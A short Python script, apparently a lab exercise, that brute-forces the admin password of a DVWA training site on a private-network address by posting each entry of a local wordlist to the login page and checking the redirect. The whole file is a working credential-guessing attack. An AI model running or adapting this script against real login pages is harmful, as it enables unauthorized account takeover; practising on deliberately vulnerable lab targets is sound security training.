import requests

url = 'http://192.168.108.143/dvwa/login.php'
arq = open('D:/Python/Vulnerability/passwd.txt')
for line in arq:
    password = line.strip()
    http = requests.post(url, data={'username': 'admin', 'password': password, 'Login': 'submit'})
    content = http.content
    if http.url == 'http://192.168.108.143/dvwa/login.php':
        print('Password incorrect : ', password)
    elif http.url == 'http://192.168.108.143/dvwa/index.php':
        print('Password correct : ', password)
        break
